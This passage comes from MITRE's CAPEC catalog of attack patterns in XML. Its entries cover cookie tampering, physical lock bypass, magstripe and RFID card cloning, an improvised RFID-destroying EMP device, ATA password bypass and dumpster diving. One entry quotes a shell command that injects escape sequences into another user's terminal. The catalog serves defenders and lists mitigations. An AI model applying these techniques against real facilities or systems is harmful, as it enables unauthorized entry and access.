            <Mitigation>Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)</Mitigation>
            <Mitigation>Make sure that all session tokens use a good source of randomness</Mitigation>
            <Mitigation>Perform validation on the server side to make sure that client side data tokens are consistent with what is expected.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>With certain price watching websites, that aggregate products available prices, the user can buy items through whichever vendors has product availability, the best price, or other differentiator. Once a user selects an item, the site must broker the purchase of that item with the vendor. Because vendors sell the same product through different channel partners at different prices, token exchange between price watching sites and selling vendors will often contain pricing information. With some price watching sites, manipulating URL-data (which is encrypted) even opaquely yields different prices charged by the fulfilling vendor. If the manipulated price turns out higher, the Attacker can cancel purchase. If the Attacker succeeded in manipulating the token and creating a lower price, he/she proceeds.</Example>
            <Example>Upon successful authentication user is granted an encrypted authentication cookie by the server and it is stored on the client. One piece of information stored in the authentication cookie reflects the access level of the user (e.g. "u" for user). The authentication cookie is encrypted using the Electronic Code Book (ECB) mode, that naively encrypts each of the plaintext blocks to each of the ciphertext blocks separately. An attacker knows the structure of the cookie and can figure out what bits (encrypted) store the information relating to the access level of the user. An attacker modifies the authentication cookie and effectively substitutes "u" for "a" by flipping some of the corresponding bits of ciphertext (trial and error). Once the correct "flip" is found, when the system is accessed, the attacker is granted administrative privileges in the system. Note that in this case an attacker did not have to figure out the exact encryption algorithm or find the secret key, but merely exploit the weakness inherent in using the ECB encryption mode.</Example>
            <Example>Archangel Weblog 0.90.02 allows remote attackers to bypass authentication by setting the ba_admin cookie to 1. See also: CVE-2006-0944</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="353"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="302"/>
            <Related_Weakness CWE_ID="472"/>
            <Related_Weakness CWE_ID="565"/>
            <Related_Weakness CWE_ID="315"/>
            <Related_Weakness CWE_ID="539"/>
            <Related_Weakness CWE_ID="384"/>
            <Related_Weakness CWE_ID="233"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="390" Name="Bypassing Physical Security" Abstraction="Meta" Status="Draft">
         <Description>Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.</Description>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="391" Name="Bypassing Physical Locks" Abstraction="Meta" Status="Draft">
         <Description>An attacker uses techniques and methods to bypass physical security measures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="390"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="392" Name="Lock Bumping" Abstraction="Meta" Status="Draft">
         <Description>An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="391"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="393" Name="Lock Picking" Abstraction="Standard" Status="Draft">
         <Description>An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="391"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="394" Name="Using a Snap Gun Lock to Force a Lock" Abstraction="Standard" Status="Draft">
         <Description>An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="391"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="395" Name="Bypassing Electronic Locks and Access Controls" Abstraction="Standard" Status="Draft">
         <Description>An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="390"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="396" Name="Bypassing Card or Badge-Based Systems" Abstraction="Standard" Status="Draft">
         <Description>An attacker bypasses the security of a card-based system by using techniques such as cloning access cards or using brute-force techniques. Card-based systems are widespread throughout business, government, and supply-chain management. Attacks against card-based systems vary widely based on the attackers' goals, but commonly include unauthorized reproduction of cards, brute-force creation of valid card-values, and attacks against systems which read or process card data. Due to the inherent weaknesses of card and badge security, high security environments will rarely rely upon the card or badge alone as a security mechanism. Common card based systems are used for financial transactions, user identification, and access control. Cloning attacks involve making an unauthorized copy of a user's card while brute-force attacks involve creating new cards with valid values. Denial of service attacks against card-based systems involve rendering the reader, or the card itself, to become disabled. Such attacks may be useful in a fail-closed system for keeping authorized users out of a location while a crime is in progress, whereas fail-open systems may grant access, or an alarm my fail to trigger, if an attacker disables or damages the card authentication device.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="395"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="397" Name="Cloning Magnetic Strip Cards" Abstraction="Standard" Status="Draft">
         <Description>An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or 'magstripe') to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of encoding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker's desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="396"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="398" Name="Magnetic Strip Card Brute Force Attacks" Abstraction="Standard" Status="Draft">
         <Description>An attacker analyzes the data on two or more magnetic strip cards and is able to generate new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals. Often, magnetic strip encoding methods follow a common format for a given system laid out in up to three tracks. A single card may allow access to a corporate office complex shared by multiple companies. By analyzing how the data is stored on a card, it is also possible to create valid cards via brute-force attacks. For example, a single card can grant access to a building, a floor, and a suite number. Reading and analyzing data on multiple cards, then performing a difference analysis between data encoded on three different cards, can reveal clues as to how to generate valid cards that grant access to restricted areas of a building or suites/rooms within that building. Data stored on magstripe cards is often unencrypted, therefore comparing which data changes when two or more cards are analyzed can yield results that aid in determining the structure of the card data. A trivial example would be a common system data format on a data track which binary encodes the suite number of a building that a card will open. By creating multiple cards with differing binary encoded segments it becomes possible to enter unauthorized areas or pass through checkpoints giving the electronic ID of other persons.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="396"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The ability to calculate a card checksum and write out a valid checksum value. Some cards are protected by a checksum calculation, therefore it is necessary to determine what algorithm is being used to calculate the checksum and to employ that algorithm to calculate and write a new valid checksum for the card being created.</Prerequisite>
         </Prerequisites>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="399" Name="Cloning RFID Cards or Chips" Abstraction="Standard" Status="Draft">
         <Description>An attacker analyzes data returned by an RFID chip and uses this information to duplicate a RFID signal that responds identically to the target chip. In some cases RFID chips are used for building access control, employee identification, or as markers on products being delivered along a supply chain. Some organizations also embed RFID tags inside computer assets to trigger alarms if they are removed from particular rooms, zones, or buildings. Similar to Magnetic strip cards, RFID cards are susceptible to duplication (cloning) and reuse. RFID (Radio Frequency Identification) are passive devices which consist of an integrated circuit for processing RF signals and an antenna. RFID devices are passive in that they lack an on on-board power source. The majority of RFID chips operate on either the 13.56 MHz or 135 KHz frequency. The chip is powered when a signal is received by the antenna on the chip, powering the chip long enough to send a reply message. An attacker is able to capture and analyze RFID data by either stimulating the chip to respond or being proximate to the chip when it sends a response to a remote transmitter. This allows the attacker to duplicate the signal and conduct attacks such as gaining unauthorized access to a building or impersonating a user's identification.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="396"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="4" Name="Using Alternative IP Address Encodings" Abstraction="Detailed" Status="Draft">
         <Description>This attack relies on the attacker using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names (FQDNs), URL, IP address, or IP Address ranges. If the location information is not validated against a variety of different possible encodings and formats, the adversary can use an alternate format to bypass application access control.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target software must fail to anticipate all of the possible valid encodings of an IP/web address.</Prerequisite>
            <Prerequisite>The adversary must have the ability to communicate with the server.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">The adversary has only to try IP address format combinations.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary needs to have knowledge of an alternative IP address encoding that bypasses the access control policy of an application. Alternatively, the adversary can simply try to brute-force various encoding possibilities.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Default deny access control policies</Mitigation>
            <Mitigation>Design: Input validation routines should check and enforce both input data types and content against a positive specification. In regards to IP addresses, this should include the authorized manner for the application to represent IP addresses and not accept user specified IP addresses and IP address formats (such as ranges)</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary identifies an application server that applies a security policy based on the domain and application name. For example, the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by using the IP address of the host instead (http://192.168.0.1:8080/application), the application authentication and authorization controls may be bypassed. The adversary relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="291"/>
            <Related_Weakness CWE_ID="173"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="40" Name="Manipulating Writeable Terminal Devices" Abstraction="Standard" Status="Draft">
         <Description>This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="248"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify attacker-writable terminals] Determine if users TTYs are writable by the attacker.</Description>
               <Technique>Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.</Technique>
               <Technique>Attempt to write to other user TTYs. This approach could leave a trail or alert a user.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Execute malicious commands] Using one or more vulnerable TTY, execute commands to achieve various impacts.</Description>
               <Technique>Commands that allow reading or writing end user files can be executed.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user's terminals.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Ability to discover permissions on terminal devices. Of course, brute force can also be used.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Access to a terminal on the target network</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Ensure that terminals are only writeable by named owner user and/or administrator</Mitigation>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>"Any system that allows other peers to write directly to its terminal process is vulnerable to this type of attack. If the terminals are available through being over-privileged (i.e. world-writable) or the attacker is an administrator, then a series of commands in this format can be used to echo commands out to victim terminals.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">"$echo -e "\033[30m\033\132" &gt; /dev/ttyXX</xhtml:div>
               <xhtml:p>where XX is the tty number of the user under attack. This will paste the characters to another terminal (tty). Note this technique works only if the victim's tty is world writable (which it may not be). That is one reason why programs like write(1) and talk(1) in UNIX systems need to run setuid." [R.40.1][REF-2]</xhtml:p>
               <xhtml:p>If the victim continues to hit "enter" and execute the commands, there are an endless supply of vectors available to the attacker, copying files, open up network connections, ftp out to servers, and so on.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="77"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description, Description Summary, Related_Vulnerabilities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attacker_Skills_or_Knowledge_Required, Related_Attack_Patterns, Type (Attack_Pattern -&gt; Relationship)</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="400" Name="RFID Chip Deactivation or Destruction" Abstraction="Standard" Status="Draft">
         <Description>An attacker uses methods to deactivate a passive RFID tag for the purpose of rendering the tag, badge, card, or object containing the tag unresponsive. RFID tags are used primarily for access control, inventory, or anti-theft devices. The purpose of attacking the RFID chip is to disable or damage the chip without causing damage to the object housing it. When correctly performed the RFID chip can be disabled or destroyed without visible damage or marking to whatever item or device containing the chip. Attacking the chip directly allows for the security device or method to be bypassed without directly damaging the device itself, such as an alarm system or computer system Various methods exist for damaging or deactivating RFID tags. For example, most common RFID chips can be permanently destroyed by creating a small electromagnetic pulse near the chip itself. One method employed requires the modifying a disposable camera by disconnecting the flash bulb and soldering a copper coil to the capacitor. Firing the camera in this configuration near any RFID chip-based device creates an EMP pulse sufficient to destroy the chip without leaving evidence of tampering. So far this attack has been demonstrated to work against RFID chips in the 13.56 MHz range.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="396"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="401" Name="Hacking Hardware" Abstraction="Standard" Status="Stable">
         <Description>An adversary exploits a weakness in access control to gain access to currently installed hardware and precedes to implement changes or secretly replace a hardware component which undermines the system's integrity for the purpose of carrying out an attack.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="440"/>
         </Related_Attack_Patterns>
         <Example_Instances>
            <Example>A malicious subcontractor or subcontractor's employee that is responsible for system maintenance secretly replaces a hard drive with one containing malicious code that will allow for backdoor access once deployed.</Example>
         </Example_Instances>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary, Examples-Instances, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Example_Instances</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Hacking Hardware Devices or Components</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="402" Name="Bypassing ATA Password Security" Abstraction="Detailed" Status="Draft">
         <Description>An attacker exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="401"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Access to the system containing the ATA Drive so that the drive can be physically removed from the system.</Prerequisite>
         </Prerequisites>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="285"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-33" Section="Chapter 9: Hacking Hardware"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="406" Name="Dumpster Diving" Abstraction="Detailed" Status="Stable">
         <Description>An adversary cases an establishment and searches through trash bins, dumpsters, or areas where company information may have been accidentally discarded for information items which may be useful to the dumpster diver. The devastating nature of the items and/or information found can be anything from medical records, resumes, personal photos and emails, bank statements, account details or information about software, tech support logs and so much more. By collecting this information an adversary may be able to learn important facts about the person or organization that play a role in helping the adversary in their attack.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="150"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary must have physical access to the dumpster or downstream processing facility.</Prerequisite>
         </Prerequisites>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Other</Impact>
               <Note>Documents and materials improperly disposed of can lead to information disclosure if an adversary comes across it.</Note>
            </Consequence>
         </Consequences>
         <References>
            <Reference External_Reference_ID="REF-348"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-08-04">Social Information Gathering via Dumpster Diving</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="407" Name="Pretexting" Abstraction="Standard" Status="Draft">
